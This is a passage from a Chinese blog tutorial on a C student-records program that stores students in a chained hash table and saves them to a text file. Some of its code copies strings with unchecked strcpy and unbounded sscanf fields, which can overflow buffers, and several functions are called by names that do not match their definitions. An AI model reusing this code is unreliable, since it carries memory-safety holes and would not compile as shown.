function_">Search_Stu</span><span class="params">(StudentDB *db, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="comment">// 尝试在内存中的哈希表查找学生</span></span><br><span class="line">    Student *foundStudent = Search_query_in_memory(db, stuid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (foundStudent != <span class="literal">NULL</span> &amp;&amp; foundStudent-&gt;stuid == stuid) &#123;</span><br><span class="line">        <span class="keyword">return</span> foundStudent;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (foundStudent == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果内存中没有找到学生，尝试从文件中加载学生信息到内存中</span></span><br><span class="line">        Load_From_File(db, filename);</span><br><span class="line">        <span class="comment">// 再次从内存中查找学生</span></span><br><span class="line">        foundStudent = Search_query_in_memory(db, stuid);</span><br><span class="line">        <span class="keyword">if</span> (foundStudent != <span class="literal">NULL</span> &amp;&amp; foundStudent-&gt;stuid == stuid) &#123;</span><br><span class="line">            <span class="keyword">return</span> foundStudent;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除学生信息"><a href="#删除学生信息" class="headerlink" title="删除学生信息"></a>删除学生信息</h2><p>删除学生信息也是分两种情况，内存中也文件中。也是通过哈希表进行删除操作。</p><p>在内存中的时候，我们直接使用 hash 表来删除，然后保存到文件。</p><h3 id="remove-student-from-memory（）"><a href="#remove-student-from-memory（）" class="headerlink" title="remove_student_from_memory（）"></a>remove_student_from_memory（）</h3><p>首先我们看到我们的哈希表结构，我们使用的是链式地址法来解决冲突问题，所以我们的每一个桶就是一个链表。所以我们在内存中的删除思路就是：首先通过学号计算哈希值定位到桶，然后在该桶的链表中进行删除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">remove_student_from_memory</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="type">int</span> hash = stuid % HASH_SIZE;</span><br><span class="line">    Student *current = db-&gt;buckets[hash];</span><br><span class="line">    Student *prev = <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (current-&gt;stuid == stuid) &#123;</span><br><span class="line">            <span class="comment">// 从哈希桶链表中删除节点</span></span><br><span class="line">            <span class="keyword">if</span> (prev) &#123;</span><br><span class="line">                prev-&gt;next = current-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                db-&gt;buckets[hash] = current-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">free</span>(current); <span class="comment">// 释放内存</span></span><br><span class="line">            db-&gt;count--;   <span class="comment">// 更新计数</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        prev = current;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先还是计算哈希值，然后让 current 来获取哈希桶中的链表头节点，然后让 prev 来跟踪 current 的前一个链表节点，我的跟踪思路是一直循环遍历链表，直到为空，然后判断我们输入的学号是否匹配，匹配则让 prev 的 next 指向当前节点的 next（也就是 current-&gt;next) 然后我们在释放当前节点的内存空间以达到删除的效果。如果没有找到相对应的学号，我们就让 prev 来成为当前节点，current 移动到下一个节点的位置。</p><p>举一个实际例子来理解：</p><p>我有三个学号，101，102，103，我要删除 102，那代码第一次迭代的时候 current 指向的是 101，学号不匹配，则 prev 指向学号 101，然后让 current 来指向学好 102，第二次迭代，学号相匹配，然后就开始做删除操作。</p><p><code>prev</code> 指针在遍历过程中始终跟随 <code>current</code> 指针，确保在找到目标节点时能够正确调整链表的指针结构。</p><h3 id="remove-student-from-file"><a href="#remove-student-from-file" class="headerlink" title="remove_student_from_file("></a>remove_student_from_file(</h3><p>由于我们之前的铺垫，我们的这个部分可以写的比较轻松了哈哈哈，按照最开始的删除思路，现在内存中查找，没有就加载文件到内存，然后再一次从内存做查找删除。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除学生信息（从文件）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">remove_student_from_file</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果内存中没有数据，先从文件加载数据</span></span><br><span class="line">    <span class="keyword">if</span> (db-&gt;count == <span class="number">0</span>) &#123;</span><br><span class="line">        Load_From_File(db, STUDENT_INFORMATION);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从哈希表中删除学生信息</span></span><br><span class="line">    Remove_Student_From_Memory(db, stuid);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将更新后的内存数据保存回文件</span></span><br><span class="line">    save_students_to_file(db);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="remove-student"><a href="#remove-student" class="headerlink" title="remove_student()"></a>remove_student()</h3><p>有了两个模块我们就可以直接写最终的删除功能了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Remove_Student</span><span class="params">(StudentDB *db, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    <span class="comment">// 尝试从内存中删除学生信息</span></span><br><span class="line">    <span class="keyword">if</span> (Remove_Student_From_Memory(db, stuid)) &#123;</span><br><span class="line">        <span class="comment">// 如果删除成功，保存更新后的数据到文件</span></span><br><span class="line">        save_students_to_file(db);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;学生 %d 已从内存和文件中删除。\n&quot;</span>, stuid);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 如果内存中未找到学生信息，则从文件加载数据到内存</span></span><br><span class="line">        Load_From_File(db, filename);</span><br><span class="line">        <span class="comment">// 再次尝试从内存中删除</span></span><br><span class="line">        <span class="keyword">if</span> (Remove_Student_From_Memory(db, stuid)) &#123;</span><br><span class="line">            <span class="comment">// 保存更新后的数据到文件</span></span><br><span class="line">            save_students_to_file(db);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;学生 %d 已从内存和文件中删除。\n&quot;</span>, stuid);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;未找到学生 %d，无法删除。\n&quot;</span>, stuid);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="修改学生信息"><a href="#修改学生信息" class="headerlink" title="修改学生信息"></a>修改学生信息</h2><p>思路：老样子，都是从内存和文件两个地方来做修改。</p><h3 id="modify-student-in-memory"><a href="#modify-student-in-memory" class="headerlink" title="modify_student_in_memory()"></a>modify_student_in_memory()</h3><p>我们通过创建了三个新的实例 new_age，new_name，new_major 来修改哈希表中的需要修改的部分。我们通过判断 student 是否为空，并且学号时候对应来做为修改的条件。</p><p>修改完之后提示是否修改成功，然后再将修改之后的内容更新到文件中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Modify_student_in_memory</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid, <span class="type">const</span> <span class="type">char</span> *new_name, <span class="type">int</span> new_age, <span class="type">const</span> <span class="type">char</span> *new_major)</span> &#123;</span><br><span class="line">    Student *student = Search_query_in_memory(db, stuid);</span><br><span class="line">    <span class="keyword">if</span> (student != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改学生信息</span></span><br><span class="line">        <span class="built_in">strcpy</span>(student-&gt;name, new_name);</span><br><span class="line">        <span class="built_in">strcpy</span>(student-&gt;major, new_major);</span><br><span class="line">        student-&gt;age = new_age;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//提示修改成功</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;修改 %d 成功\n&quot;</span>, student-&gt;stuid);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 保存修改后的学生信息到文件</span></span><br><span class="line">        save_students_to_file(db);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到学生 %d！\n&quot;</span>, stuid);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="modify-student-in-file"><a href="#modify-student-in-file" class="headerlink" title="modify_student_in_file()"></a>modify_student_in_file()</h3><p>这里的代码思路其实和 remove_student_from_file()很像</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改学生信息（从文件）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">modify_student_from_file</span><span class="params">(StudentDB *db, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> stuid, <span class="type">const</span> <span class="type">char</span> *new_name, <span class="type">int</span> new_age, <span class="type">const</span> <span class="type">char</span> *new_major)</span> &#123;</span><br><span class="line">    <span class="comment">// 如果内存中没有数据，先从文件加载数据到哈希表</span></span><br><span class="line">    <span class="keyword">if</span> (db-&gt;count == <span class="number">0</span>) &#123;</span><br><span class="line">        Load_From_File(db, filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 在内存中修改学生信息</span></span><br><span class="line">    modify_student_in_memory(db, stuid, new_name, new_age, new_major);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将修改后的学生信息保存回文件</span></span><br><span class="line">    save_students_to_file(db);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就不过多讲述了，因为太相似了。</p><h3 id="modify-student"><a href="#modify-student" class="headerlink" title="modify_student"></a>modify_student</h3><p>我们这里的 modify_student 是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改学生信息（统一函数）</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Modify_Stu</span><span class="params">(StudentDB *db, <span class="type">int</span> stuid)</span> &#123;</span><br><span class="line">    Student *stu = Search_query_in_memory(db, stuid);</span><br><span class="line">    <span class="keyword">if</span> (stu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 如果内存中没有，尝试从文件加载</span></span><br><span class="line">        Load_From_File(db, STUDENT_INFORMATION);</span><br><span class="line">        stu = Search_query_in_memory(db, stuid);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (stu == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;未找到学生 %d\n&quot;</span>, stuid);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 显示当前信息</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n当前学生信息:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学号: %d\n&quot;</span>, stu-&gt;stuid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;姓名: %s\n&quot;</span>, stu-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;年龄: %d\n&quot;</span>, stu-&gt;age);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;专业: %s\n&quot;</span>, stu-&gt;major);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输入新信息</span></span><br><span class="line">    <span class="type">char</span> input[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n输入新信息(直接回车保留原值):\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 姓名</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新姓名 [%s]: &quot;</span>, stu-&gt;name);</span><br><span class="line">    <span class="keyword">if</span> (fgets(input, <span class="keyword">sizeof</span>(input), <span class="built_in">stdin</span>) &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        input[<span class="built_in">strcspn</span>(input, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(stu-&gt;name, input, <span class="keyword">sizeof</span>(stu-&gt;name));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 年龄</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新年龄 [%d]: &quot;</span>, stu-&gt;age);</span><br><span class="line">    <span class="keyword">if</span> (fgets(input, <span class="keyword">sizeof</span>(input), <span class="built_in">stdin</span>) &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        stu-&gt;age = atoi(input);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 专业</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新专业 [%s]: &quot;</span>, stu-&gt;major);</span><br><span class="line">    <span class="keyword">if</span> (fgets(input, <span class="keyword">sizeof</span>(input), <span class="built_in">stdin</span>) &amp;&amp; input[<span class="number">0</span>] != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        input[<span class="built_in">strcspn</span>(input, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        <span class="built_in">strncpy</span>(stu-&gt;major, input, <span class="keyword">sizeof</span>(stu-&gt;major));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 保存到文件</span></span><br><span class="line">    save_students_to_file(db);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n学生信息更新成功!\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="显示所有学生信息"><a href="#显示所有学生信息" class="headerlink" title="显示所有学生信息"></a>显示所有学生信息</h2><p>这个也可以分为两个情景来写，刚写完就查看和从文件中读取再查看</p><h3 id="Show-All-Students-From-Memory"><a href="#Show-All-Students-From-Memory" class="headerlink" title="Show_All_Students_From_Memory()"></a>Show_All_Students_From_Memory()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显示内存中的所有学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show_All_Stu_From_Memory</span><span class="params">(StudentDB *db)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_SIZE; i++) &#123;</span><br><span class="line">        Student *current = db-&gt;buckets[i];</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;学号：%d, 姓名：%s, 年龄：%d, 专业：%s\n&quot;</span>,</span><br><span class="line">                   current-&gt;stuid, current-&gt;name, current-&gt;age, current-&gt;major);</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Show-All-Students-From-Memory-1"><a href="#Show-All-Students-From-Memory-1" class="headerlink" title="Show_All_Students_From_Memory()"></a>Show_All_Students_From_Memory()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显示文件中的所有学生信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Show_All_Stu_From_File</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    FILE *file = fopen(filename, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;无法打开文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123;</span><br><span class="line">        <span class="comment">// 假设文件中的每一行存储一个学生的信息，格式为：学号,姓名,年龄,专业</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, line);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="文件功能"><a href="#文件功能" class="headerlink" title="文件功能"></a>文件功能</h2><h3 id="Load-From-File"><a href="#Load-From-File" class="headerlink" title="Load_From_File()"></a>Load_From_File()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Load_From_File</span><span class="params">(StudentDB *db, <span class="type">const</span> <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    FILE *file = fopen(filename, <span class="string">&quot;r&quot;</span>); <span class="comment">// 以只读模式打开文件</span></span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;Error opening file&quot;</span>); <span class="comment">// 如果文件打开失败，输出错误信息</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> line[<span class="number">256</span>]; <span class="comment">// 定义一个字符数组，用于存储每一行的内容</span></span><br><span class="line">    <span class="keyword">while</span> (fgets(line, <span class="keyword">sizeof</span>(line), file)) &#123; <span class="comment">// 使用 fgets 逐行读取文件内容</span></span><br><span class="line">        Student *newStudent = (Student *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Student)); <span class="comment">// 为新的学生信息分配内存</span></span><br><span class="line">        <span class="comment">// 使用 sscanf 解析每一行的数据</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">sscanf</span>(line, <span class="string">&quot;%d,%[^,],%d,%[^,]&quot;</span>, &amp;newStudent-&gt;stuid, newStudent-&gt;name, &amp;newStudent-&gt;age, newStudent-&gt;major) == <span class="number">4</span>) &#123;</span><br><span class="line">            Add_Stu(db, newStudent); <span class="comment">// 将解析出来的学生信息添加到内存中的哈希表</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">free</span>(newStudent); <span class="comment">// 如果解析失败，释放为新学生分配的内存</span></span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 跳过当前循环，继续处理下一行</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file); <span class="comment">// 关闭文件</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="save-to-file"><a href="#save-to-file" class="headerlink" title="save_to_file()"></a>save_to_file()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将学生信息保存到文件</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_students_to_file</span><span class="params">(StudentDB *db)</span> &#123;</span><br><span class="line">    FILE *file = fopen(STUDENT_INFORMATION, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;无法打开文件&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; HASH_SIZE; i++) &#123;</span><br><span class="line">        Student *current = db-&gt;buckets[i];</span><br><span class="line">        <span class="keyword">while</span> (current != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(file, <span class="string">&quot;%d,%s,%d,%s\n&quot;</span>, current-&gt;stuid, current-&gt;name, current-&gt;age, current-&gt;major);</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;学生信息已保存到文件！\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="完整代码："><a href="#完整代码：" class="headerlink" title="完整代码："></a>完整代码：</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span 